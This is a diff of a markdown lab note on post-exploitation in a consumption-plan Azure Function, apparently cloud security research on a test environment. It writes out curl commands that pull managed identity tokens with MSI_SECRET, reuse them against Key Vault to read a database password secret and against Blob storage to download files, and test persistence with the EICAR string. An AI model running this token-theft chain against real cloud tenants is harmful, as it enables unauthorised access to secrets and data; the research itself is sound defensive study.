@@ -1,6 +1,6 @@
 # Azure Consumption Execution Environment
 
-Running under a consumption based Azure function (cold starts). Included a SP attached to the run.
+Running under a consumption based Azure function (cold starts). Included a SP attached identity to the function for MSI testing.
 
 ## Function Invocation
 
@@ -178,6 +178,8 @@ cat ~/.aspnet/DataProtection-Keys/key-76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5.xml
   </descriptor>
 ```
 
+Querying the MSI service for bearer tokens:
+
 ```
 env | grep 'MSI'
 
@@ -189,20 +191,12 @@ Research on MSI architecture: https://techcommunity.microsoft.com/t5/Azure-Devel
 
 
 ```
-curl -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
+curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
 ```
 
-Response is a JWT that can be used to access the storage service for 8 hours.
+Response is a JWT that can be used to access the storage service for 8 hours. Example of the decoded token:
 
-```
-curl -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net"
-```
-
-Response is a JWT that can be used to access the vault service. 
-
-Example of the decoded token:
-
-```
+```json
 {
     "aud": "https://storage.azure.com/",
     "iss": "https://sts.windows.net/ad0e23cd-ec45-4fba-b7ea-cd29f4795e78/",
@@ -222,23 +216,81 @@ Example of the decoded token:
 }
 ```
 
+## Token Pivoting
 
-Extract the data:
+### Azure Key Vault
 
+[API Documentation](https://docs.microsoft.com/en-us/rest/api/keyvault/)
+
+From the compromised function, request a Bearer token for the vault service:
+
+```bash
+curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net"
 ```
-curl -H "Authorization: Bearer <ACCESS TOKEN>" "https://pumaprey-cougar-vault.vault.azure.net/secrets/cougar-key/99954a23109643c694afdd028bc6f0cf?api-version=7.0"
+
+List the secrets:
+
+```bash
+export AZURE_BEARER_TOKEN=<SET TOKEN VALUE>
+export VAULT_NAME=<ENTER_KEY_VAULT_NAME>
+curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
 ```
 
-TODO: Storage command to pull sensitive file
+List the versions for the secret:
 
+```bash
+export COUGAR_DB_PASS=$(curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0" | jq -r '.value[0].id' )
+curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0"
 ```
+
+Read a secret value:
+
+```bash
+export COUGAR_DB_PASS_V0=$(curl -s -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0" | jq -r '.value[0].id')
+curl -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "$COUGAR_DB_PASS_V0?api-version=7.0"
+```
+
+### Azure Storage
+
+[API Documentation](https://docs.microsoft.com/en-us/rest/api/storageservices/)
+
+From the compromised function, request a Bearer token for the storage service:
+
+```bash
+curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
+```
+
+List the storage account containers:
+
+```bash
+export AZURE_BEARER_TOKEN=<SET TOKEN VALUE>
+export STORAGE_ACCOUNT=<ENTER STORAGE ACCOUNT NAME>
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list"
+```
+
+OMG, you're killing me MS. XML? How the hell am I supposed to `jq` this now.
+
+```xml
+<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://<STORAGE_ACCOUNT_NAME>.blob.core.windows.net/"><Containers><Container><Name>azure-webjobs-hosts</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:28 GMT</Last-Modified><Etag>"0x8D784DBFDE574A4"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>azure-webjobs-secrets</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:53 GMT</Last-Modified><Etag>"0x8D784DC0CC0565B"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>function-releases</Name><Properties><Last-Modified>Mon, 23 Dec 2019 18:44:03 GMT</Last-Modified><Etag>"0x8D787D8157D05E8"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>images</Name><Properties><Last-Modified>Tue, 24 Dec 2019 18:24:51 GMT</Last-Modified><Etag>"0x8D7889E911892AF"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>scm-releases</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:21 GMT</Last-Modified><Etag>"0x8D784DBF9AF6632"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container></Containers><NextMarker /></EnumerationResults>
+```
+
+List the blobs in the images container:
+
+```bash
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images?restype=container&comp=list"
+```
+
+Download our target cougar image:
+
+```bash
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $AZURE_BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images/cougar.jpg" --output ~/Downloads/cougar.jpg
 ```
 
 ## Persistence
 
 Persisting a malware payload into the runtime environment:
 
-```
+```bash
 echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /tmp/malware.sh
 cat /tmp/malware.sh
 X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
@@ -246,34 +298,22 @@ X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
 
 Waiting approximately 1 minute:
 
-```
+```bash
 cat /tmp/malware.sh
 X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
 ```
 
 Waiting approximately 2 minutes:
 
-```
+```bash
 cat /tmp/malware.sh
 X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
 ```
 Waiting approximately 3 minutes:
 
-```
-cat /tmp/malware.sh
-X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
-```
-
-After approximately 15 minutes, still there:
-
-```
-cat /tmp/malware.sh
-X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
-```
-
 Slowly started increasing the inactivity to 2, 3, 4, 5, and so on minutes. Finally, after 6 minutes of inactivity:
 
-```
+```bash
 cat /tmp/malware.sh
 cat: /tmp/malware.sh: No such file or directory
 ```
